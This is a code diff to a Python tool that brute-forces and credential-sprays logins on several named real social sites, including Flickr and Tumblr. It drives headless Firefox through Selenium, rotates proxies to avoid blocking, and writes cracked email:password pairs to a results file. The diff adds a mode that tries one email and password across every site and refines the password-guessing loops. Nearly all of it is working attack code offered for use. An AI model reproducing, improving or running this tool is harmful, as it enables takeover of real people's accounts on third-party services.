@@ -41,12 +41,13 @@ use = OptionParser("""{}
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░░▀▄▄▄▄▄▄▄▄▄▄█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-{}========================================================================================
+{}=========================================================================================
 -> --getproxylist                   export_filename (E.x: proxy_list.txt)
 -< --loadproxylist                  import_filename
 -~ --type_social_media              Type Social media (E.x: gapo or gapo,biztime)
 -# --list_password                  List Password BruteForce
--$ --password                       Single Password BruteForce
+-$ --password                       Password BruteForce
+-! --gmail                          gmail BruteForce
 -% --single_finder                  Single gmail finder
 -@ --multi_finder                   Multi gmail finder
 -G --gapo                           ACCOUNT gapo
@@ -71,6 +72,8 @@ use.add_option("-#", "--list_password", dest="list_password",
                help="Write Your list password")
 use.add_option("-$", "--password", dest="password",
                help="Write Your password")
+use.add_option("-!", "--gmail", dest="gmail",
+               help="Write Your Gmail")
 use.add_option("-%", "--single_finder", dest="single_finder",
                help="Write your gmail finder")
 use.add_option("-@", "--multi_finder", dest="multi_finder",
@@ -94,9 +97,9 @@ use.add_option("-D", "--desentric", dest="desentric",
 
 (options, args) = use.parse_args()
 url_list = ['https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/', 'https://identity.flickr.com/login', 'https://www.tumblr.com/login',
-            'https://zoimas.com/welcome/login', 'https://befilo.com/welcome/login', 'https://desentric.com//guest', 'https://myopportunity.com/signin', 'https://login.xing.com/']
+            'https://zoimas.com/welcome/login', 'https://befilo.com/welcome/login', 'https://desentric.com//guest']
 social_name = ['gapo', 'biztime', 'hahalolo',
-               'flickr', 'tumblr', 'zoimas', 'befilo']
+               'flickr', 'tumblr', 'zoimas', 'befilo', 'desentric']
 # ===============================Get_Proxy_List============================
 
 
@@ -106,19 +109,23 @@ def getProxyList():
 
 
 def finder():
-    gmail_list = []
-    if options.single_finder != None:
-        gmail_list.append(options.single_finder)
-    if options.multi_finder != None:
-        for gm in io.open(options.list_gmail, "r").readlines():
-            gmail_list.append(gm.rstrip("\n"))
-    if len(gmail_list) == 0:
+    try:
+        gmail_list = []
+        if options.single_finder != None:
+            gmail_list.append(options.single_finder)
+        if options.multi_finder != None:
+            for gm in io.open(options.multi_finder, "r").readlines():
+                gmail_list.append(gm.rstrip("\n"))
+        if len(gmail_list) == 0:
+            print(Fore.LIGHTMAGENTA_EX +
+                  "[!] Write your gmail (-%) or list gmail(-@)"+Fore.RESET)
+        while len(gmail_list) != 0:
+            gm = gmail_list.pop()
+            print(Fore.LIGHTCYAN_EX+"Gmail: "+gm+Fore.RESET)
+            search_social_media_by_gmail(gm)
+    except:
         print(Fore.LIGHTMAGENTA_EX +
               "[!] Write your gmail (-%) or list gmail(-@)"+Fore.RESET)
-    while len(gmail_list) != 0:
-        gm = gmail_list.pop()
-        print(Fore.LIGHTCYAN_EX+"Gmail: "+gm+Fore.RESET)
-        search_social_media_by_gmail(gm)
 
 
 # =================================LOAD_PROXY==============================
@@ -176,32 +183,19 @@ password_list = []
 
 
 def load_password_list():
-    if options.password != None:
-        password_list.append(options.password)
-    if options.list_password != None:
-        for passwd in io.open(options.list_password, "r").readlines():
-            password_list.append(passwd.rstrip("\n"))
-    if len(password_list) == 0:
+    try:
+        if options.password != None:
+            password_list.append(options.password)
+        if options.list_password != None:
+            for passwd in io.open(options.list_password, "r").readlines():
+                password_list.append(passwd.rstrip("\n"))
+        if len(password_list) == 0:
+            print(Fore.LIGHTMAGENTA_EX +
+                  "[!] Write your password (-$) or list password(-#)"+Fore.RESET)
+    except:
         print(Fore.LIGHTMAGENTA_EX +
               "[!] Write your password (-$) or list password(-#)"+Fore.RESET)
-# =============================CHECK_PASSWORD=================================
 
-
-def check_password():
-    gapo = threading.Thread(target=gapo, name="Gapo").start()
-    biztime = threading.Thread(target=biztime, name="Biztime").start()
-    hahalolo = threading.Thread(
-        target=hahalolo, name="Hahalolo").start()
-    flickr = threading.Thread(
-        target=flickr, name="Flickr").start()
-    tumblr = threading.Thread(
-        target=tumblr, name="Tumblr").start()
-    zoimas = threading.Thread(
-        target=zoimas, name="Zoimas").start()
-    befilo = threading.Thread(
-        target=befilo, name="Befilo").start()
-    desentric = threading.Thread(
-        target=desentric, name="Desentric").start()
 # =================================GAPO========================================
 
 
@@ -210,19 +204,19 @@ def gapo():
     count_while = 0
     count_login = 0
     print("{}Gapo Account: {}{}".format(
-        Fore.LIGHTYELLOW_EX, options.gapo, Fore.RESET))
+        Fore.LIGHTCYAN_EX, options.gapo, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     path = "//div[@id='root']/div[2]/div/div[2]/"
     count_socialname = [0, 'gapo']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://www.gapo.vn/login")
@@ -230,9 +224,8 @@ def gapo():
                     By.XPATH, path+"div[3]/input"), options.gapo)
                 brows.find_element(By.XPATH, path+"button").click()
                 count_login = 1
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             if len(password) < 8 or len(password) > 50:
                 count_while += 1
                 print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
@@ -250,11 +243,14 @@ def gapo():
                 brows.find_element(By.XPATH, path+"div[2]/input").clear()
                 print(Fore.LIGHTRED_EX+"[X]GAPO "+password+Fore.RESET)
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
             except selenium.common.exceptions.NoSuchElementException:
                 print("{}[V]GAPO Password Found [{}]{}".format(
                     Fore.LIGHTGREEN_EX, password, Fore.RESET))
-                io.open("BruteForce_result.txt", "a").write("gapo-" +
-                                                            options.gapo+":"+password+"\n")
+                io.open("BruteForce_result.txt", "a").write(
+                    "gapo-"+options.gapo+":"+password+"\n")
                 brows.quit()
                 break
         except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
@@ -276,33 +272,31 @@ def biztime():
     count_login = 0
     brows = None
     print("{}Biztime Account: {}{}".format(
-        Fore.LIGHTYELLOW_EX, options.biztime, Fore.RESET))
+        Fore.LIGHTCYAN_EX, options.biztime, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
-    op = Options()
-    # op.headless = True
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     count_socialname = [0, 'biztime']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://biztime.com.vn/")
                 send_keys(brows.find_element(
                     By.NAME, "username"), options.biztime)
                 count_login = 1
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(By.NAME, "password"), password)
             brows.find_element(
                 By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
             try:
+                brows.implicitly_wait(5)
                 brows.find_element(
                     By.XPATH, "//div[@class='valign tag_auth_animation']")
                 print("{}[V]BIZTIME Password Found [{}]{}".format(
@@ -319,6 +313,9 @@ def biztime():
                 brows.find_element(By.NAME, "password").clear()
                 print(Fore.LIGHTRED_EX+"[X]BIZTIME "+password+Fore.RESET)
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
         except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
             print(Fore.LIGHTMAGENTA_EX +
                   '[!]BIZTIME Brute Force Error!!!. Again'+Fore.RESET)
@@ -337,18 +334,19 @@ def hahalolo():
     brows = None
     count_while = 0
     count_login = 0
-    print("\rHahalolo Account: {}".format(options.hahalolo))
+    print("{}Hahalolo Account: {}{}".format(
+        Fore.LIGHTCYAN_EX, options.hahalolo, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     count_socialname = [0, 'hahalolo']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://accounts.hahalolo.com/sign-in/")
@@ -360,9 +358,8 @@ def hahalolo():
                     count_login = 0
                     continue
                 count_login = 1
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(By.ID, "password"), password)
             brows.find_element(
                 By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
@@ -376,6 +373,9 @@ def hahalolo():
             brows.find_element(By.ID, "password").clear()
             print(Fore.LIGHTRED_EX+"[X]HAHALOLO "+password+Fore.RESET)
             count_while += 1
+            if count_while == len(password_list):
+                brows.quit()
+                break
         except selenium.common.exceptions.NoSuchElementException:
             print(
                 "{}[V]HAHALOLO Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -402,6 +402,9 @@ def flickr():
     count_login = 0
     print("{}Flickr Account: {}".format(Fore.LIGHTCYAN_EX, options.flickr))
     print("{}<<<<<<+++++Start Attacking Flickr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     brows = None
     er_id = ""
     count_socialname = [0, 'flickr']
@@ -409,11 +412,8 @@ def flickr():
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://identity.flickr.com/login")
@@ -421,17 +421,19 @@ def flickr():
                     By.XPATH, "//input[@id='login-email']"), options.flickr)
                 brows.find_element(
                     By.XPATH, "//form/button").click()
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(
                 By.XPATH, "//input[@id='login-password']"), password)
             brows.find_element(
                 By.XPATH, "//form/button").click()
             try:
-                brows.implicitly_wait(15)
+                brows.implicitly_wait(10)
                 while True:
                     er_id_new = brows.find_element(By.XPATH, "//form//p").id
+                    print(er_id)
+                    print(er_id_new)
+                    print("========================")
                     if er_id_new != er_id:
                         er_id = er_id_new
                         break
@@ -450,19 +452,22 @@ def flickr():
                 count_login = 0
                 brows.quit()
             count_while += 1
+            if count_while == len(password_list):
+                brows.quit()
+                break
         except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
             print(Fore.LIGHTMAGENTA_EX +
                   '[!]FLICKR Brute Force Error!!!. Again'+Fore.RESET)
             brows.quit()
             count_login = 0
             continue
-        except:
+        except Exception as e:
+            print(e)
             print(Fore.LIGHTMAGENTA_EX +
                   '[!]FLICKR Brute Fore Stopping...'+Fore.RESET)
             brows.quit()
             break
 # ================================TUMBLR=======================================
-# not
 
 
 def tumblr():
@@ -470,25 +475,24 @@ def tumblr():
     count_login = 0
     print("{}Tumblr Account: {}".format(Fore.LIGHTCYAN_EX, options.tumblr))
     print("{}<<<<<<+++++Start Attacking Tumblr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    # if options.gmail != None:
+    # ops.headless = True
     brows = None
     count_socialname = [0, 'tumblr']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://www.tumblr.com/login")
                 send_keys(brows.find_element(
                     By.XPATH, "//input[@name='email']"), options.tumblr)
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(
                 By.XPATH, "//input[@name='password']"), password)
             brows.find_element(
@@ -496,7 +500,7 @@ def tumblr():
             try:
                 t = time.time()
                 while brows.find_element(By.XPATH, "//span[@class='EvhBA']").text != "Log in":
-                    if time.time() - t > 7:
+                    if time.time() - t > 10:
                         brows.quit()
                         count_login = 0
                         continue
@@ -512,6 +516,9 @@ def tumblr():
                     count_login = 0
                     brows.quit()
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]TUMBLR Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -539,25 +546,24 @@ def zoimas():
     count_login = 0
     print("{}Zoimas Account: {}".format(Fore.LIGHTCYAN_EX, options.zoimas))
     print("{}<<<<<<+++++Start Attacking Zoimas++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     brows = None
     count_socialname = [0, 'zoimas']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://zoimas.com/welcome/login")
                 send_keys(brows.find_element(
                     By.XPATH, "//input[@name='username']"), options.zoimas)
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(
                 By.XPATH, "//input[@name='password']"), password)
             brows.find_element(
@@ -570,6 +576,9 @@ def zoimas():
                     By.XPATH, "//input[@name='password']").clear()
                 count_login += 1
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]ZOIMAS Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -596,25 +605,24 @@ def befilo():
     count_login = 0
     print("{}Befilo Account: {}".format(Fore.LIGHTCYAN_EX, options.befilo))
     print("{}<<<<<<+++++Start Attacking Befilo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     brows = None
     count_socialname = [0, 'befilo']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://befilo.com/welcome/login")
                 send_keys(brows.find_element(
                     By.XPATH, "//input[@name='username']"), options.befilo)
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             send_keys(brows.find_element(
                 By.XPATH, "//input[@name='password']"), password)
             brows.find_element(
@@ -630,6 +638,9 @@ def befilo():
                 #     count_login = 0
                 #     brows.quit()
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]BEFILO Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -657,17 +668,17 @@ def desentric():
     print("{}Desentric Account: {}".format(
         Fore.LIGHTCYAN_EX, options.desentric))
     print("{}<<<<<<+++++Start Attacking Desentric++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    ops = Options()
+    if options.gmail != None:
+        ops.headless = True
     brows = None
     count_socialname = [0, 'desentric']
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
             if count_login == 0:
-                if options.password == None:
-                    brows = webdriver.Firefox(
-                        desired_capabilities=changeProxy(count_socialname))
-                else:
-                    brows = webdriver.Firefox()
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy(count_socialname), options=ops)
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://desentric.com//guest")
@@ -678,9 +689,8 @@ def desentric():
                 time.sleep(1)
                 send_keys(brows.find_element(
                     By.XPATH, "//input[@name='email']"), options.desentric)
-            if options.password == None:
-                print(Fore.LIGHTYELLOW_EX +
-                      'Password [==] '+password+Fore.RESET)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             if len(password) < 6 or len(password) > 20:
                 print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                 count_while += 1
@@ -709,6 +719,9 @@ def desentric():
                 #     count_login = 0
                 #     brows.quit()
                 count_while += 1
+                if count_while == len(password_list):
+                    brows.quit()
+                    break
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]DESENTRIC Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -738,7 +751,7 @@ def send_keys(element, key):
 
 
 try:
-    if options.list_password != None:
+    if options.list_password != None or options.password != None:
         load_password_list()
     check = False
     if options.getproxylist != None:
@@ -747,11 +760,16 @@ try:
         finder = threading.Thread(target=finder, name="Finder")
         check = True
         finder.start()
-    if options.password != None:
-        check_password = threading.Thread(
-            target=check_password, name="Check_password")
-        check = True
-        check_password.start()
+    if options.password != None and options.gmail != None:
+        print(Fore.LIGHTCYAN_EX+"CHECK LOGIN WITH GMAIL: " +
+              options.gmail+" AND PASSWORD: "+options.password)
+        options.biztime = options.gmail
+        options.hahalolo = options.gmail
+        options.flickr = options.gmail
+        options.tumblr = options.gmail
+        options.zoimas = options.gmail
+        options.befilo = options.gmail
+        options.desentric = options.gmail
     if options.gapo != None:
         gapo = threading.Thread(target=gapo, name="Gapo")
         check = True
